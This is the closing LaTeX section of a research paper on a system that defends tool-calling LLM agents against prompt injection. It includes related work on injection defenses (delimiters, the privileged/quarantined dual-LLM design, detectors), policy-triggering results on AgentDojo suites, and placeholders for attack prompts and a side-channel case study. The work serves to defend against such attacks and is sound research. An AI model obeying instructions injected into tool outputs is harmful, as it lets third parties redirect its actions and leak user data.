I.S. came up with the original idea and wrote the technical design proposal, T.F. organised the student internship proposal; J.H., C.S., N.C., C.K., T.F. gave very early feedback on the proposal; E.D. led the technical development; E.D., I.S. co-led the design of \sysname{}, with close help of J.H. and T.F; I.S. and T.F. did reviews for the codebase; T.F. with help of D.F. led the technical and administrative efforts ensuring that everything runs smoothly; A.T., N.C., D.F., C.K., C.S., F.T. provided multiple rounds of very helpful comments and feedback; everyone contributed to the development of the manuscript, with most input from E.D. and I.S.



\newpage
\printbibliography









\appendix

\section{Extended Related Work}
\subsection{Background: Software Security Concepts}

\subsubsection{Computer security nomenclature}\label{sec:nomenclature}

In this work we extensively use terminology from the computer security literature. \textbf{Security Policy} is defined by \citet{anderson2002security} as ``a high-level specification of the security properties that a given system should possess''. Such policies describe the overall goals of the system, define the subjects and the objects in the system, and finally restrict the operations that they can perform. An example of a policy could be: ``no internal Need-to-Know documents should be sent to external parties.'' Currently, such policy is not enforceable for machine learning models in a robust way.

We also adopt notions of control and data flows. \textbf{Control Flow} here refers to the execution flow of a given program or an agent, while \textbf{Data Flow} refers to how data flows within a given execution flow. Within the context of a classic software program, control flow refers to instructions that are executed within a program, while data flow refers to how data propagates between the instructions~\citep{abadi2009control}. \textbf{Capabilities}, in turn, are unforgeable ``tags'',``tokens'', or ``keys'', that grant specific fine-grained access rights to a resource or functionality~\citep{needham1977cambridge}. They provide a flexible way to control what actions, tools, or the agent generally can perform. For instance, imagine that every file on cloud storage is associated with a capability. Then, we can enforce that a tool can only execute if it possess a specific file-corresponding capability.

At the same time, defining both control and data flows is generally impossible for machine learning models,\footnote{Both data and the model are exactly the same semantically -- consider a linear model $Ax+b=y$, here both $A$ and $b$ represent control flow, while $x$ represents data flow. Both are just matrices. A similar argument could be made about data and instructions for classical software as they are both data. The difference lies in that instruction streams are generally structured and restricted in their representations, which is not the case in machine learning, at least currently.} since data and control flow are inherently intertwined and it is hard to explicitly separate the two in generality. However, in an agentic setting with explicit tools and data sources it becomes possible. For example, consider a user prompt ``Can you send Bob the document he requested in our last meeting? Bob's email and the document he asked for are in the meeting notes file.'' as depicted in~\Cref{fig:example_flows}. Here, to solve this query the model explicitly needs to perform a sequence of well defined instructions -- find recent meeting notes, find email in the notes, find document name in the notes, fetch document by name, send email with the fetched document to the fetched email address. With explicit control flow defined, similarly data flow appears.

\subsubsection{Access and Information Flow Controls}\label{app:ac-ifc}

Ensuring program integrity, i.e. that the program was not modified since last authorised modification, and confidentiality, i.e. that the program preserves the promise of secrecy, are fundamental challenges in computer security. One prominent threat to integrity is the buffer overflow attack~\citep{aleph1996smashing}, which exploits memory vulnerabilities to execute malicious code, usually violating the intended control flow of the program. Control Flow Integrity (CFI), as proposed by \citet{abadi2009control}, addresses this by instrumenting binaries to enforce adherence to a pre-defined Control Flow Graph (CFG), thereby restricting execution only to legitimate paths, reducing attack surface, but not fully eliminating it~\citep{carlini2014rop}. Beyond integrity, controlling access to sensitive information is crucial. Access Control mechanisms~\citep{anderson2010security}, broadly categorised into Mandatory Access Control (MAC) and Discretionary Access Control (DAC), govern how resources are accessed. Furthermore, Information Flow Control (IFC)~\citep{denning1976lattice,myers1997decentralized} provides confidentiality by tracking information, preventing leaks of sensitive data into unauthorized contexts. This can be achieved through various methods, including static code analysis to formally verify program properties~\citep{dennind1977certification} and language-based security mechanisms, such as specialized type systems~\citep{sabelfeld2003language}.

\subsubsection{Tool-calling LLM Agents}\label{app:tc-agents}

Large Language Models can be enhanced by interacting via programmatic APIs to expand their functionality~\citep{schick2023toolformer}. Usually, models such as Gemini~\citep{geminiteam2024gemini}, LLaMa 3.1~\citep{dubey2024llama3}, Claude 3~\citep{claude}, and GPT-4~\citep{openai2024gpt4} are provided with the API documentation (e.g., what the tool does and the description of its input) as part of the system prompt, and they generate text in a specific format which is interpreted by the LLM runtime as a tool call. The runtime then runs the tool and returns the result as part of the conversation with the LLM. The LLM, then, can decide whether it needs to further request a tool call based on the previous tool's output.

\subsection{Prompt Injection Defenses}\label{app:pi-defenses}

Several defenses have been proposed to defend against prompt injection attacks. \citet{hines2024defending} propose to delimit untrusted parts of the context with special characters, and explicitly instructing the model to not follow instructions within the delimiters. In a similar spirit, prompt sandwiching~\citep{learnprompting2024sandwich} consists of showing the model the original task after each tool output. \citet{chen2024struq} train a model to accept structured queries and follow only the instructions which are in one portion of the query. \citet{wallace2024instruction,wu2024instructional} fine-tune the model to ignore illegitimate instruction, but only follow the original instructions instead. \citet{abdelnabi2024you} propose to keep track of the LLM's internal representations to see if they significantly change direction during the task execution, signalling that the task that the model is executing has changed along the way. \citet{sharma2024spml} uses a structured formal language to define the task of the model and detects when the task being executed is different from the original one. \citet{zverev2025aside} proposes to separate text to be interpreted by the LLM as instructions from text to be interpreted as data at the architectural level, by using different input embeddings for different input types.

A line of work also proposes to detect prompt injection attacks (with a BERT-based detector~\citep{protectai2024deberta}), or by detecting data exfiltration via canaries~\citep{debenedetti2024dataset}. Close to our work is~\citet{wu2024system}, who make use of Information Flow Control to keep track of which parts of the tool outputs are trusted and can be fed to the tool-calling model.

Foundational to our work is the defense proposed, with a high-level description, by \citet{willison2023dualllm}. \citeauthor{willison2023dualllm} proposes an isolation-based model, where the tool calls are planned by a \textit{privileged} LLM which only sees the user prompt and never sees untrusted, third-party data. Then, this LLM queries a \textit{Quarantined} LLM--which does not have any tool-calling capabilities--to process untrusted data (e.g., to summarize an email). In this way, an adversary planting a prompt injection will not be able to cause the privileged LLM to call a tool which was not meant to be called in the original plan, hence defending against all attacks where the adversary needs a different sequence of tool calls than the user. Furthermore, \citet{wu2025isolategpt} takes a similar approach to defend against attacks from untrusted tools via isolation, and requires explicit user approval before giving tools access to the outputs of other tools for all queries, hence being prone to causing user fatigue.

Finally, we describe concurrent work. \citet{zhong2025rtbas} also employs integrity and confidentiality labels, however, instead of tracking dependencies by explicitly employing a control flow graph, they use a classifier to establish whether a region of text depends on other regions of text. Moreover, the labelling is coarser, by only employing private and public labels, and trusted and untrusted ones, which does not allow for security policies that are as expressive as \sysname's. \citet{abdelnabi2025firewalls} focus on the travel planning task for agent to agent communications. Here, \citeauthor{abdelnabi2025firewalls} use synthetic data to extract and define policies that the agent can then use to restrict data flow. \citet{kim2025prompt,li2025ace,costa2025securing} propose defenses which follow a similar blueprint as \sysname{}: they use an LLM with tool access to use with trusted inputs, and an LLM without tool access to use on untrusted inputs and an untrusted LLM, and a set of security policies to be enforced at tool-calling time.

\section{Full results tables}

\input{figures/tables/utility_table}

\input{figures/tables/utility_under_attack_table}

\input{figures/tables/n_successful_attacks_table}

\section{Baseline results}

\begin{figure}
	\centering
	\includegraphics[width=0.5\linewidth]{results/defenses-utility-under-attack.pdf}
	\caption{Break down by suite of the utility under attack for defenses. Full results in \Cref{tab:defenses-utility-under-attack}.}
	\label{fig:defenses-utility-attack}
\end{figure}

\input{figures/tables/baseline_tables}

\section{NORMAL vs. STRICT modes}

\begin{figure}
	\centering
	\includegraphics[width=.48\textwidth]{dep-graph-camel-normal}
	\caption{Dependency graph generated by \sysname for the natural language query ``If my last email is about a meeting tomorrow, forward it to email@example.com'', generated using \sysname's \pythoninline{NORMAL} mode. Notice that, as opposed to the dependency graph in \Cref{fig:camel-dep-graph-strict}, the call to \pythoninline{send_email} does not have a dependency on \pythoninline{query_ai_assistant}.}
	\label{fig:camel-dep-graph-normal}
\end{figure}

\begin{table}[H]
	\centering
	\caption{Policy triggering rates in normal and strict modes when not under attack.}
	\label{tab:normal-vs-strict-no-attack}
	\begin{tabular}{lrrrrr}
		\toprule
		                      & \textbf{Overall} & \textbf{Banking} & \textbf{Slack} & \textbf{Travel} & \textbf{Workspace} \\
		Mode                  &                  &                  &                &                 &                    \\
		\midrule
		\pythoninline{NORMAL} & $33.87\%$        & $58.33\%$        & $60.00\%$      & $0.00\%$        & $16.67\%$          \\
		\pythoninline{STRICT} & $53.23\%$        & $58.33\%$        & $80.00\%$      & $80.00\%$       & $33.33\%$          \\
		\bottomrule
	\end{tabular}
\end{table}

\begin{table}[H]
	\centering
	\caption{Policy triggering rates in normal and strict modes when under attack.}
	\label{tab:normal-vs-strict-attack}
	\begin{tabular}{lrrrrr}
		\toprule
		                      & \textbf{Overall} & \textbf{Banking} & \textbf{Slack} & \textbf{Travel} & \textbf{Workspace} \\
		Mode                  &                  &                  &                &                 &                    \\
		\midrule
		\pythoninline{NORMAL} & $26.54\%$        & $52.94\%$        & $58.82\%$      & $0.00\%$        & $17.37\%$          \\
		\pythoninline{STRICT} & $45.34\%$        & $61.76\%$        & $77.94\%$      & $51.35\%$       & $35.68\%$          \\
		\bottomrule
	\end{tabular}
\end{table}

\section{Security Policy evaluation}
\label{sec:all_eval_policies}


\input{figures/tables/policies}

\begin{figure}[H]
	\centering
	\begin{subfigure}{.5\linewidth}
		\includegraphics[width=\linewidth]{results/triggering-rate-non-adv.pdf}
		\caption{Benign evaluation}
	\end{subfigure}%
	\begin{subfigure}{.5\linewidth}
		\includegraphics[width=\linewidth]{results/triggering-rate-adv.pdf}
		\caption{Adversarial evaluation}
	\end{subfigure}%
	\caption{This figure shows how often security policies are triggered during the benign and adversarial evaluations with \sysname{} enabled. The x-axis shows the different models that were evaluated, and the y-axis shows the percentage of tasks for which the security policies were triggered. The proportions are reported for all tasks.}
	\label{fig:triggering_rates_all}
\end{figure}

\section{Extended overheads results}\label{sec:extra-overhead}

\begin{figure}[ht]
	\centering
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=\linewidth]{figures/results/tokens_increase/input_tokens_increase-claude-3-5-sonnet-latest-camel.pdf}
		\caption{Input token usage increase}
		\label{fig:increased-input-tokens-no-attack}
	\end{subfigure}%
	\hfill
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=\linewidth]{figures/results/tokens_increase/output_tokens_increase-claude-3-5-sonnet-latest-camel.pdf}
		\caption{Output token usage increase}
		\label{fig:increased-output-tokens-no-attack}
	\end{subfigure}
	\caption{We measure the increase in tokens usage when using \sysname compared to native tool calling, not under attack, using Claude 3.5 Sonnet as backbone model, tokenizing using \pythoninline{tiktoken}. The red line represents the increase in token usage for the median task.}
	\label{fig:increased-tokens-no-attack}
\end{figure}

\input{figures/tables/token-increase-claude-3-5-sonnet-latest}
\input{figures/tables/token-usage-claude-3-5-sonnet-latest}
\input{figures/tables/token-usage-claude-3-5-sonnet-latest-important_instructions}
\input{figures/tables/token-increase-claude-3-5-sonnet-latest-important_instructions}

\section{Breakdown for individual failure modes for Claude 3.5 Sonnet v2}
\label{sec:breakdown_failuremode}
\input{figures/tables/failure_modes}

\section{Implementation details}

\subsection{System prompt}\label{app:system-prompt}

This is the system prompt provided to the \rewriter (in Markdown format).

\input{prompts/system_prompt}

For the banking suite, we add the following sentence: ``Note that, in the transaction history, the transactions from the user have 'me' as sender, and still have positive amounts.'', and we provide access to the \texttt{datetime}-related classes (and mention them in the system prompt) only in the workspace and travel suites.

\subsection{Exceptions prompt}\label{app:exceptions-prompt}

\input{prompts/exception_prompt}

If the exception has a dependency on untrusted data, then the exception text is redacted, and the following text is shown:
\begin{framed}
	\begin{Verbatim}[breaklines=true]
		<The exception was redacted because it came from an untrusted source. Try to infer what the problem was from the context provided.>
	\end{Verbatim}
\end{framed}

\subsection{Case-study: when control flow turns into data flow from Claude and o3-mini}
\label{sec:control_flow_is_data_flow_with_agents}
\input{prompts/attack_prompt_claude}
\input{prompts/attack_prompt_o3-mini}

\subsection{Examples of failed tasks}
\label{sec:failed_task_examples}
\subsubsection{Workspace 11: Query misunderstanding}
Query is ``How long do I have to go to my lunch with Sarah?'' The model assumes that it's from now, and not from the previous calendar event.
\input{prompts/failedtasks_claude/workspace/11}

\subsubsection{Slack 11: Data Requires action}
Some data need to be fetched from a website but P-LLM does not see it
\input{prompts/failedtasks_claude/slack/11}

\subsubsection{Workspace 18: Wrong assumptions from P-LLM}
Model assumes at what time the hike starts.
\input{prompts/failedtasks_claude/workspace/11}

\subsubsection{Banking 2: Not enough context for Q-LLM}
P-LLM asks to extract IBAN from email, but the IBAN is not there
\input{prompts/failedtasks_claude/banking/2}

\subsubsection{Workspace 36: Q-LLM overdoes it/Strict eval}
\input{prompts/failedtasks_claude/workspace/36}

\subsubsection{Banking 14: Ambiguous task}
Q-LLM can't recognize ambiguous transaction (iPhone 3Gs bought for 1000\$ in 2023)
\input{prompts/failedtasks_claude/banking/14}

\subsubsection{Travel 19: Underdocumented API}
\input{prompts/failedtasks_claude/travel/19}

\subsubsection{Travel 19: AgentDojo Bug}
Bug in the evaluation: the model provides the operating hours but the utility check looks for the day.
\input{prompts/failedtasks_claude/travel/9}

\section{More sophisticated side-channel}
\label{sec:side-channel-exceptions-expanded}
\input{prompts/sophisticated_sidechannel.tex}


\end{document}
